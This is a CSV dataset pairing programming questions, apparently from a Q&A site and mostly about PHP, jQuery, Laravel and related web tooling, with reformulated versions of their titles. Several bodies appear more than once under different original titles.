originalTitle,body,reformulatedTitle
Get checked checkbox value of specified div," I need to find checked value of specified divs having ids: optrep0,optrep1,optrep2 above, I have tried using And send optrep0 variable to server, but it will send every checked value. So, I want to send only specified divs only per variable, I also tried PS: sub id name on td id cannot be changed as is as, I only need javascript example how to solve this case, thank you :D <code>  <td id=""optrep0""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td><td id=""optrep1""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td><td id=""optrep2""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td> var optrep0= jQuery(':checkbox:checked').map(function () { return this.value;}).get(); var optrep0= jQuery('#optrep0>#warna:checkbox:checked').map(function () { return this.value; }).get();",How to get checked checkbox value of specified div in jQuery
Jquery Get checked checkbox value of specified div," I need to find checked value of specified divs having ids: optrep0,optrep1,optrep2 above, I have tried using And send optrep0 variable to server, but it will send every checked value. So, I want to send only specified divs only per variable, I also tried PS: sub id name on td id cannot be changed as is as, I only need javascript example how to solve this case, thank you :D <code>  <td id=""optrep0""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td><td id=""optrep1""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td><td id=""optrep2""> <input type=""checkbox"" value=""1"" class=""warna"" id=""warna"" name=""warna[]""> <input type=""checkbox"" value=""2"" class=""warna"" id=""warna"" name=""warna[]""> </td> var optrep0= jQuery(':checkbox:checked').map(function () { return this.value;}).get(); var optrep0= jQuery('#optrep0>#warna:checkbox:checked').map(function () { return this.value; }).get();",How to get checked checkbox value of specified div in jQuery
str_replace for uppercase and lowercase," How do I use str_replace but to be case-insensitive when it searches for the string? For example, suppose i want to replace ABcD with a. The resulting command would be $string=str_replace(""ABcD"",""a"",$string);. But if there is some string like ""abCD"" then again I have to use $string=str_replace(""abCD"",""a"",$string);.  <code> ",Case-insensitive str_replace
Zend Gdata - missing HeaderValue.php," So I am following this and I'm trying to run his first php example. I get the following error: PHP Warning: require_once(Zend/Http/Header/HeaderValue.php): failed to open stream: No such file or directory in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Http/Client.php on line 45I checked and the file is in fact not there. So I added it from the minimial 1.12 download. It then says Zend/Xml/Security.php doesn't exist so i add it. Now I am getting the following error: I have a google spreadsheet that I would like to update programatically using php. Can you tell me whats going wrong with this script? Seems like this is an old article. Are there more recent articles I am missing?  <code>  PHP Notice: Undefined offset: 1 in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/ClientLogin.php on line 150PHP Stack trace:PHP 1. {main}() /opt2/sites/gdataApi/test.php:0PHP 2. Google_Spreadsheet->__construct() /opt2/sites/gdataApi/test.php:11PHP 3. Google_Spreadsheet->login()/opt2/sites/gdataApi/Google_Spreadsheet.php:40PHP 4. Zend_Gdata_ClientLogin::getHttpClient() /opt2/sites/gdataApi/Google_Spreadsheet.php:223PHP Notice: Undefined variable: php_errormsg in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php on line 834PHP Stack trace:PHP 1. {main}() /opt2/sites/gdataApi/test.php:0PHP 2. Google_Spreadsheet->addRow() /opt2/sites/gdataApi/test.php:24PHP 3. Google_Spreadsheet->getSpreadsheetId() /opt2/sites/gdataApi/Google_Spreadsheet.php:62PHP 4. Zend_Gdata_Spreadsheets->getSpreadsheetFeed() /opt2/sites/gdataApi/Google_Spreadsheet.php:252PHP 5. Zend_Gdata->getFeed() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/Spreadsheets.php:150PHP 6. Zend_Gdata_App->getFeed() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata.php:162PHP 7. Zend_Gdata_App->importUrl() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:213PHP 8. Zend_Gdata_App::importString() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:792PHP Fatal error: Uncaught exception 'Zend_Gdata_App_Exception' with message 'DOMDocument cannot parse XML: ' in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:833Stack trace:#0 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php(792): Zend_Gdata_App::importString('', 'Zend_Gdata_Spre...', NULL, NULL)#1 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php(213): Zend_Gdata_App->importUrl('https://spreads...', 'Zend_Gdata_Spre...', NULL)#2 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata.php(162): Zend_Gdata_App->getFeed('https://spreads...', 'Zend_Gdata_Spre...')#3 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/Spreadsheets.php(150): Zend_Gdata->getFeed('https://spreads...', 'Zend_Gdata_Spre...')#4 /opt2/sites/gdataApi/Google_Spreadsheet.php(252): Zend_Gdata_Spreadsheets->getSpreadsheetFeed()#5 /opt2/sites/gdataApi/Google_Spreadsheet.php(62): Google_Spreadsheet->getSpreadsheetId('test spreadshee...')#6 /opt2/sites/gdataApi/test.php(24): Google_Spreadsheet in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php on line 833",Zend Gdata - missing HeaderValue.php
Zend Gdata - DOMDocument cannot parse XML," So I am following this and I'm trying to run his first php example. I get the following error: PHP Warning: require_once(Zend/Http/Header/HeaderValue.php): failed to open stream: No such file or directory in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Http/Client.php on line 45I checked and the file is in fact not there. So I added it from the minimial 1.12 download. It then says Zend/Xml/Security.php doesn't exist so i add it. Now I am getting the following error: I have a google spreadsheet that I would like to update programatically using php. Can you tell me whats going wrong with this script? Seems like this is an old article. Are there more recent articles I am missing?  <code>  PHP Notice: Undefined offset: 1 in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/ClientLogin.php on line 150PHP Stack trace:PHP 1. {main}() /opt2/sites/gdataApi/test.php:0PHP 2. Google_Spreadsheet->__construct() /opt2/sites/gdataApi/test.php:11PHP 3. Google_Spreadsheet->login()/opt2/sites/gdataApi/Google_Spreadsheet.php:40PHP 4. Zend_Gdata_ClientLogin::getHttpClient() /opt2/sites/gdataApi/Google_Spreadsheet.php:223PHP Notice: Undefined variable: php_errormsg in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php on line 834PHP Stack trace:PHP 1. {main}() /opt2/sites/gdataApi/test.php:0PHP 2. Google_Spreadsheet->addRow() /opt2/sites/gdataApi/test.php:24PHP 3. Google_Spreadsheet->getSpreadsheetId() /opt2/sites/gdataApi/Google_Spreadsheet.php:62PHP 4. Zend_Gdata_Spreadsheets->getSpreadsheetFeed() /opt2/sites/gdataApi/Google_Spreadsheet.php:252PHP 5. Zend_Gdata->getFeed() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/Spreadsheets.php:150PHP 6. Zend_Gdata_App->getFeed() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata.php:162PHP 7. Zend_Gdata_App->importUrl() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:213PHP 8. Zend_Gdata_App::importString() /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:792PHP Fatal error: Uncaught exception 'Zend_Gdata_App_Exception' with message 'DOMDocument cannot parse XML: ' in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php:833Stack trace:#0 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php(792): Zend_Gdata_App::importString('', 'Zend_Gdata_Spre...', NULL, NULL)#1 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php(213): Zend_Gdata_App->importUrl('https://spreads...', 'Zend_Gdata_Spre...', NULL)#2 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata.php(162): Zend_Gdata_App->getFeed('https://spreads...', 'Zend_Gdata_Spre...')#3 /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/Spreadsheets.php(150): Zend_Gdata->getFeed('https://spreads...', 'Zend_Gdata_Spre...')#4 /opt2/sites/gdataApi/Google_Spreadsheet.php(252): Zend_Gdata_Spreadsheets->getSpreadsheetFeed()#5 /opt2/sites/gdataApi/Google_Spreadsheet.php(62): Google_Spreadsheet->getSpreadsheetId('test spreadshee...')#6 /opt2/sites/gdataApi/test.php(24): Google_Spreadsheet in /opt2/sites/gdataApi/ZendGdata-1.12.13/library/Zend/Gdata/App.php on line 833",Zend Gdata - missing HeaderValue.php
PHP7 : Missing VCRUNTIME140.dll," I have an error when I start PHP 7 on Windows. When I run php on the command line, it returns a message box with system error: The program can't start because VCRUNTIME140.dll is missing from your computer. Try reinstalling the program to fix this problem.After that, CLI is crashing.As I don't want to install a DLL file from an external website, I don't know how to fix this!PHP version: 7.0.0alpha1 VC14 x64 Thread Safe <code> ",PHP 7: Missing VCRUNTIME140.dll
Regex to replace character with character itself and -," I need to replace some camelCase characters with the camel Case character and a -.What I have got is a string like those: Those strings are going through this regex to seperate the number from the street: Now, I have two problems. I'm very bad at regex.Above regex also cuts every - from the streets name, and there are a lot of those names in germany and europe. Actually it would be quite easy to just adjust the regex to not cut any hyphens, but I want to learn how regex works and so I decided to try to find a regex that just replaces every camel case letter in the string with except for the first uppercase letter appearance. I've managed to find a regex that shows me the places I need to paste a hyphen like so: https://regex101.com/r/qI2iA9/1But how on earth do I replace this string: that it becomes <code>  Albert-Weisgerber-Allee 35Bruninieku iela 50-10 $data = preg_replace(""/[^ \w]+/"", '', $data);$pcre = '\A\s*(.*?)\s*\x2f?(\pN+\s*[a-zA-Z]?(?:\s*[-\x2f\pP]\s*\pN+\s*[a-zA-Z]?)*)\s*\z/ux';preg_match($pcre, $data, $h); - & matched Camel Case letter .[A-Z]{1}/ug AlbertWeisgerberAllee Albert-Weisgerber-Allee",Regex to replace character with character itself and hyphen
"Godaddy - SMTP Error(220-We do not authorize the use of this system to transport unsolicited, 220 and/or bulk e-mail.)"," I am current using CodeIgniter 2.2.2 and I have the following code inside my controller: I tried using port 465, and ssl://xxxxxxx.prod.iad2.secureserver.net. But i am getting no luck at all. I tried contacting the customer service, but nope. They really didn't help me much other than giving me links into things I already knew.Why am I getting the message? It is preventing me to send email to my other email addresses.Can anyone please help here? <code>  $config['protocol'] = ""smtp""; $config['smtp_host'] = ""mail.domain.com""; $config['smtp_port'] = ""25""; $config['smtp_user'] = ""noreply@somedomain.com""; $config['smtp_pass'] = ""password""; $config['charset'] = ""utf-8""; $config['mailtype'] = ""html""; $config['newline'] = ""\r\n""; $config['wordwrap'] = TRUE; $this->load->library('email'); $this->email->initialize($config); $this->email->set_mailtype('html'); $this->email->from('noreply@somedomain.com', 'www.somedomain.com'); $this->email->to('someEmail'); $this->email->subject('Email Authentication'); $message = 'Hi'; $this->email->message($message); $this->email->send();","SMTP Error(220-We do not authorize the use of this system to transport unsolicited, 220 and/or bulk e-mail.)"
Ratchet / Websockets : How to know how many clients that subscribed to an object?," I would like to know how many clients are actually subscribing to a chatroom / conversation.To be more precise, i just want to know if there is more than 1 client. (Chatroom are actually a private conversation between two users).There is only one chatroom / private conversation at a time (per user). So in the given code, how to get $nb_clients?Update:I guess I'm starting to see a solution.Here my second attempt: Any ideas if that would properly work? It actually seems to work but i'm still not sure if it is the best solution. I actually got inspired from Ratchet github. <code>  class Chat implements WampServerInterface{ protected $conversationId; public function __construct(){ $this->conversationId = null; } public function onSubscribe(ConnectionInterface $conn, $conversation_id){ $this->conversationId = $conversation_id; echo ""Client $conn->resourceId assigned to the conversation : $conversation_id\n""; } public function onPublish(ConnectionInterface $conn, $conversation_id, $event, array $exclude, array $eligible){ // How to get $nb_clients ? echo ""$nb_clients User(s) in conversation""; echo ""Message sent to $conversation_id : $event""; // ... $message = $event; // Send data to conversation $this->conversationId->broadcast($message); }} class Chat implements WampServerInterface{ protected $conversation = array(); public function onSubscribe(ConnectionInterface $conn, $conversation_id){ $conversation_id = (string) $conversation_id; if(!array_key_exists($conversation_id, $this->conversation)){ $this->conversation[$conversation_id] = 1; } else{ $this->conversation[$conversation_id]++; } echo ""{$this->conversation[$conversation_id]}\n""; echo ""Client $conn->resourceId assigned to the conversation : {$conversation_id}\n""; } public function onUnSubscribe(ConnectionInterface $conn, $conversation_id){ // Foreach conversations or given conversation remove one client $this->conversation[$conversation_id]--; echo ""$this->conversation[$conversation_id]\n""; echo ""Client $conn->resourceId left the conversation : $conversation_id\n""; } public function onOpen(ConnectionInterface $conn){ echo ""New connection! ({$conn->resourceId})\n""; } public function onClose(ConnectionInterface $conn){ $this->onUnsubscribe($conn, $this->conversation); echo ""Connection closed!\n""; } public function onCall(ConnectionInterface $conn, $id, $fn, array $params){ } public function onPublish(ConnectionInterface $conn, $conversation_id, $event, array $exclude, array $eligible){ $conversation_id = (string) $conversation_id; $nb_clients = $this->conversation[$conversation_id] echo ""$nb_clients User(s) in conversation""; echo ""Message sent to $conversation_id : $event""; // ... $message = $event; // Send data to conversation $this->conversation[$conversation_id]->broadcast($message); } public function onError(ConnectionInterface $conn, \Exception $e){ echo ""An error has occurred: {$e->getMessage()}\n""; $conn->close(); }}",Ratchet / Websockets : How many clients subscribing to an object?
money format not showing currency," I'm trying to use money_format function. While it should print $ sign or USD ?I'm on linux hosting.Thanks <code>  <?php$number = 1299.46;setlocale(LC_MONETARY, 'en_US');echo money_format('%i', $number); // Outputs 1299.46",money_format() not showing currency
How can I safely edit a composer package in Laravel 5?," I want to edit a package I pulled from composer in my Laravel 5 project, however i believe that if I ran composer update and a new version of this package has been released, I will lose all of my changes. How should I go about editing the package? Is there a way to copy package out of the vendor directory so I can use it somewhere else in my project? <code> ",Safely edit a third party composer (vendor) package in Laravel & prevent losing customized changes on release of a new version of the package
Use PHP to list info from Web Service using SOAP," I have never used SOAP before (and still wouldn't have if not needed) but I need to make an input search to list info (with the help of php or javascript) from a web service using SOAP and I have this Query, the XML Service Deschiption and the method address: And this method prototype: ...and I basically don't know where to start or what to do to put these together. This web service contains info of all the justice files and their status/updates and so on. An example of it working is on their own website. <code>  {AdresaInterfata}?op= CautareDosare [WebMethod(Description = ""Cautare dosare dupa numar, obiect, institutie"")] public Dosar[] CautareDosare( string numarDosar, string obiectDosar, string numeParte, Institutie? institutie, DateTime? dataStart, DateTime? dataStop )",Use PHP to list info from a Web Service that's using SOAP
How to parse php variable inside a json file?," I have a php script , it accessing a json file by using file_get_contents(), inside a json file, we have declared a php variable. Please let me know is there any way to parse the php variable inside a json file.Below is the code:test.json php script for accessing the json file Now the output is like below: But I need the output like this I'm not able to access the $result variable inside a json file.Any help Appreciated.Thanks <code>  { ""result"":""$result"", ""count"":3} <?php$result = 'Hello';$event = file_get_contents('test.json');echo $event;?> { ""result"":""$result"", ""count"":3 } { ""result"":""Hello"", ""count"":3 } ",How can I interpolate an existing php string literal inside a json file?
Telegram Bot - Receive images," Is it possible to receive images (and store it on the server) which was sent by any user to the bot?If a image was sent, I receive this JSON post. This is a link to the Telegram Bot-API description. I don't know if it's possible to receive the whole image or not: https://core.telegram.org/bots/api#available-types <code>  {""update_id"":XXXXX,""message"":{""message_id"":2222,""from"":{""id"":XXXXX,""first_name"":""Christoph"",""last_name"":""XXXXX""},""chat"":{""id"":XXXXX,""first_name"":""Christoph"",""last_name"":""XXXXX""},""date"":1435704055,""forward_from"":{""id"":XXXXX,""first_name"":""Christoph"",""last_name"":""XXXXX""},""forward_date"":1435703471,""photo"":[{""file_id"":""AgADAgADmaoxG9KknwF4O978o3EMqb_EWSoABI5s-WWq46dqiR0AAgI"",""file_size"":998,""width"":51,""height"":90},{""file_id"":""AgADAgADmaoxG9KknwF4O978o3EMqb_EWSoABHax4HvxYqktiB0AAgI"",""file_size"":9912,""width"":180,""height"":320},{""file_id"":""AgADAgADmaoxG9KknwF4O978o3EMqb_EWSoABNzzDwp3sT2whx0AAgI"",""file_size"":41020,""width"":450,""height"":800},{""file_id"":""AgADAgADmaoxG9KknwF4O978o3EMqb_EWSoABE0Gg-AefJ7Yhh0AAgI"",""file_size"":66058,""width"":720,""height"":1280}]}}",How to receive images with the Telegram API?
some images not displaying in php mime emails," I am sending a mail using PEAR's mail and mail_mime packages and sample code as below: I am facing a strange issue while sending the mails through this code. I have images inside the email body, sometimes the images not displaying. When I debug the issue, I found that . is missing in the image url. But if I print the mail just before the send line (as I comment out in the code) it prints with the image perfectly. correct image url: http://www.domain.com/image.pngin the mail : http://www.domaincom/image.png or http://www.domain.com/imagepng ... etc.part of the HTML code which has the image as below: And the very strange thing is it is displaying properly in outlook but not in other clients as for outlook I have separate code(as per the code).Does anybody have any idea how to debug the issue or any comment on this issue.Edited:This issue is nothing to do with any specific tag (although I explain it using image tag), I experience it in several places such as in styles.example : line-heigth:1.5; is the original and it changes to line-heigth:15; while sending out. Basically it just remove the . here & there in the email HTML. <code>  $sendStart=array();require_once('Mail.php');require_once('Mail/mime.php');$sendStart['mail'] =& Mail::factory('mail');$sendStart['mime'] = new Mail_mime(""\n"");$sendStart['mime']->setHTMLBody($html);$sendStart['headers']['Subject']=$title;$sendStart['headers']['X-SMTPAPI']='{""category"": [""MailID-XXX""]}';$body=$sendStart['mime']->get(array( 'html_charset'=>'UTF-8', 'text_charset'=>'UTF-8', 'head_charset'=>'UTF-8' ));//echo ($sendStart['mime']->_htmlbody); exit;$sendStart['mail']->send('xxx@example.com',$sendStart['mime']->headers($sendStart['headers']),$body); <table cellpadding=""0"" cellspacing=""0"" border=""0"" class=""image-table image-2"" align=""center"" style=""float:none;margin-left:auto;margin-right:auto;text-align:left;""> <tbody> <tr> <td class=""element"" style=""text-align: left;height: auto;overflow: hidden;-webkit-text-size-adjust: none;""> <!--[if gte mso 9]><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none; text-decoration: none; display: block; clear: none; float: none; margin-left: auto; margin-right: auto;display:none; mso-hide: none;"" align=""center"" width=""394""><![endif]--><![if !mso]><!-- --><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none;text-decoration: none;display: block;clear: none;float: none;width: 100%;height: auto;max-width: 394px;margin-left: auto;margin-right: auto;*width: 394px;-ms-interpolation-mode: bicubic;"" align=""center""><!--<![endif]--> </td> </tr> </tbody></table>",dot(.)s are missing here & there in the mail html while sending PEAR Mail_Mime emails
images not displaying in php mime emails due to missing dot," I am sending a mail using PEAR's mail and mail_mime packages and sample code as below: I am facing a strange issue while sending the mails through this code. I have images inside the email body, sometimes the images not displaying. When I debug the issue, I found that . is missing in the image url. But if I print the mail just before the send line (as I comment out in the code) it prints with the image perfectly. correct image url: http://www.domain.com/image.pngin the mail : http://www.domaincom/image.png or http://www.domain.com/imagepng ... etc.part of the HTML code which has the image as below: And the very strange thing is it is displaying properly in outlook but not in other clients as for outlook I have separate code(as per the code).Does anybody have any idea how to debug the issue or any comment on this issue.Edited:This issue is nothing to do with any specific tag (although I explain it using image tag), I experience it in several places such as in styles.example : line-heigth:1.5; is the original and it changes to line-heigth:15; while sending out. Basically it just remove the . here & there in the email HTML. <code>  $sendStart=array();require_once('Mail.php');require_once('Mail/mime.php');$sendStart['mail'] =& Mail::factory('mail');$sendStart['mime'] = new Mail_mime(""\n"");$sendStart['mime']->setHTMLBody($html);$sendStart['headers']['Subject']=$title;$sendStart['headers']['X-SMTPAPI']='{""category"": [""MailID-XXX""]}';$body=$sendStart['mime']->get(array( 'html_charset'=>'UTF-8', 'text_charset'=>'UTF-8', 'head_charset'=>'UTF-8' ));//echo ($sendStart['mime']->_htmlbody); exit;$sendStart['mail']->send('xxx@example.com',$sendStart['mime']->headers($sendStart['headers']),$body); <table cellpadding=""0"" cellspacing=""0"" border=""0"" class=""image-table image-2"" align=""center"" style=""float:none;margin-left:auto;margin-right:auto;text-align:left;""> <tbody> <tr> <td class=""element"" style=""text-align: left;height: auto;overflow: hidden;-webkit-text-size-adjust: none;""> <!--[if gte mso 9]><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none; text-decoration: none; display: block; clear: none; float: none; margin-left: auto; margin-right: auto;display:none; mso-hide: none;"" align=""center"" width=""394""><![endif]--><![if !mso]><!-- --><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none;text-decoration: none;display: block;clear: none;float: none;width: 100%;height: auto;max-width: 394px;margin-left: auto;margin-right: auto;*width: 394px;-ms-interpolation-mode: bicubic;"" align=""center""><!--<![endif]--> </td> </tr> </tbody></table>",dot(.)s are missing here & there in the mail html while sending PEAR Mail_Mime emails
dot(.)s are missing here & there in the mail html while sending the php mime mails," I am sending a mail using PEAR's mail and mail_mime packages and sample code as below: I am facing a strange issue while sending the mails through this code. I have images inside the email body, sometimes the images not displaying. When I debug the issue, I found that . is missing in the image url. But if I print the mail just before the send line (as I comment out in the code) it prints with the image perfectly. correct image url: http://www.domain.com/image.pngin the mail : http://www.domaincom/image.png or http://www.domain.com/imagepng ... etc.part of the HTML code which has the image as below: And the very strange thing is it is displaying properly in outlook but not in other clients as for outlook I have separate code(as per the code).Does anybody have any idea how to debug the issue or any comment on this issue.Edited:This issue is nothing to do with any specific tag (although I explain it using image tag), I experience it in several places such as in styles.example : line-heigth:1.5; is the original and it changes to line-heigth:15; while sending out. Basically it just remove the . here & there in the email HTML. <code>  $sendStart=array();require_once('Mail.php');require_once('Mail/mime.php');$sendStart['mail'] =& Mail::factory('mail');$sendStart['mime'] = new Mail_mime(""\n"");$sendStart['mime']->setHTMLBody($html);$sendStart['headers']['Subject']=$title;$sendStart['headers']['X-SMTPAPI']='{""category"": [""MailID-XXX""]}';$body=$sendStart['mime']->get(array( 'html_charset'=>'UTF-8', 'text_charset'=>'UTF-8', 'head_charset'=>'UTF-8' ));//echo ($sendStart['mime']->_htmlbody); exit;$sendStart['mail']->send('xxx@example.com',$sendStart['mime']->headers($sendStart['headers']),$body); <table cellpadding=""0"" cellspacing=""0"" border=""0"" class=""image-table image-2"" align=""center"" style=""float:none;margin-left:auto;margin-right:auto;text-align:left;""> <tbody> <tr> <td class=""element"" style=""text-align: left;height: auto;overflow: hidden;-webkit-text-size-adjust: none;""> <!--[if gte mso 9]><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none; text-decoration: none; display: block; clear: none; float: none; margin-left: auto; margin-right: auto;display:none; mso-hide: none;"" align=""center"" width=""394""><![endif]--><![if !mso]><!-- --><img alt=""Placeholder Image"" src=""http://www.domain.com/image.png"" style=""outline: none;text-decoration: none;display: block;clear: none;float: none;width: 100%;height: auto;max-width: 394px;margin-left: auto;margin-right: auto;*width: 394px;-ms-interpolation-mode: bicubic;"" align=""center""><!--<![endif]--> </td> </tr> </tbody></table>",dot(.)s are missing here & there in the mail html while sending PEAR Mail_Mime emails
replace username in email address into artestic, How can I convert username in email addresses into asterisks. The first and last letter in the username stay as it is and rest replaced with (*). Example: into  <code>  mhyunf@gmail.com m****f@gmail.com,Replace username part in email addresses into asterisks
Laravel TestCase and JWT Tokens," SummaryWe are writing unit tests to test the creation and invalidation of JWT tokens and receiving a ""The token could not be parsed from the request"" error back from a JWTException every time we try to JWTAuth::invalidate the token.DescriptionInside our controller, to create a user token, we are passing through the user email address and then returning the JWT token.Afterwards, we are destroying the token by invalidating it using invalidateToken method and passing through the token by sending an Authorization header. This works perfectly by using Postman as well as PHPStorms Restful client.When we try to write a test for this method, we are faced with an error response and a ""The token could not be parsed from the request"" error message.Our test is as follow: We are using Laravel 5.1 (which has the cookies as a parameter before the server parameter)PHP version 5.6.10PHPUnit 3.7.28* EDIT *Updated to PHPUnit 4.7.6 and still failing to send through Authorization header.* SOLUTION *In my controller __construct method, I have these few lines of code that is running and sorted out my issue. <code>  public function invalidateToken(){ try { JWTAuth::invalidate(JWTAuth::getToken()); return Response::json(['status' => 'success'], 200); } catch (JWTException $e) { return Response::json(['status' => 'error', 'message' => $e->getMessage()], 401); }} public function testInvalidateToken(){ $createUserToken = $this->call('POST', '/token/create', ['email' => 'test@test.com']); $user = $this->parseJson($createUserToken); $response = $this->call('POST', '/token/invalidate', [/* params */], [/* cookies */], [/* files */], ['HTTP_Authorization' => 'Bearer '.$user->token]); // var_dump($user->token); // die(); $data = $this->parseJson($response); $this->assertEquals($data->status, 'success'); $this->assertEquals($data->status, '200');} if ((\App::environment() == 'testing') && array_key_exists(""HTTP_Authorization"", Request::server())) { JWTAuth::setRequest(\Route::getCurrentRequest());}",Laravel TestCase not sending Authorization headers (JWT Token)
Difference between setting ID directly and setting elequent associate relation when saving a model in Laravel?," I have two tables, employees and employee types.employees has the following fieldsid (PK)employee_type_id (FK)nameand employee_type has the following fields,id (PK)titleMy eloquent model functions are,Employee EmployeeType I am not sure if this is the correct way to keep a relation.While inserting I can follow these two methods:1.Setting ID 2.Setting relation Both methods are working fine.What is the difference between these two types of insertion? Which is best method? <code>  class Employee extends Model { public function employeeTypes() { return $this->belongsTo('App\Model\EmployeeType'); }} class EmployeeType extends Model {} $emp = new Employee(); $emp->employee_type_id = $request->type_id; $emp->name = $request->name; $emp->save(); $emp->employeeTypes()->associate(EmployeeType::findOrFail($request->employee_types_id));$emp->name = $request->name;$emp->save();",Difference between setting ID directly and setting eloquent associate relation when saving a model in Laravel?
How to set time zone in code igniter?," I am working in a php project using codeigniter. Please advise me what is the global way to set time zone for php and mysql . In which file I can set this. I want to set it without php.ini and .htaccess file.currently I am using this before every entry -: <code>  date_default_timezone_set(""Asia/Kolkata"");$time = Date('Y-m-d h:i:s');",How to set time zone in codeigniter?
why should I create a design for 404 not found page?," I want to know the advantage of 404 Not Found page. Why should one create a design for that ? Why not just set 404 header and redirect it to the home page with a message something like ""What do you want of the URL? Please just walk into the website"".I figured many websites have a special page for the purpose. But why ?Regards <code> ","Why design for ""404 not found"" page needed?"
Why should one design a 404 not found page?," I want to know the advantage of 404 Not Found page. Why should one create a design for that ? Why not just set 404 header and redirect it to the home page with a message something like ""What do you want of the URL? Please just walk into the website"".I figured many websites have a special page for the purpose. But why ?Regards <code> ","Why design for ""404 not found"" page needed?"
Consuming several WebServices with PHP ate the same time (SOAP and REST)," My objective is consume various Web Services and then merge the results.I was doing this using PHP cURL, but as the number of Web Services has increased, my service slowed since the process was waiting for a response and then make the request to the next Web Service.I solved this issue using curl_multi and everything was working fine.Now, I have a new problem, because I have new Web Services to add in my service that use Soap Protocol and I can't do simultaneous requests anymore, because I don't use cURL for Soap Web Services, I use SoapClient.I know that I can make the XML with the soap directives and then send it with cURL, but this seems to me a bad practice.In short, is there some way to consume REST and SOAP Web Services simultaneously? <code> ",Consuming SOAP and REST WebServices at the same time in PHP
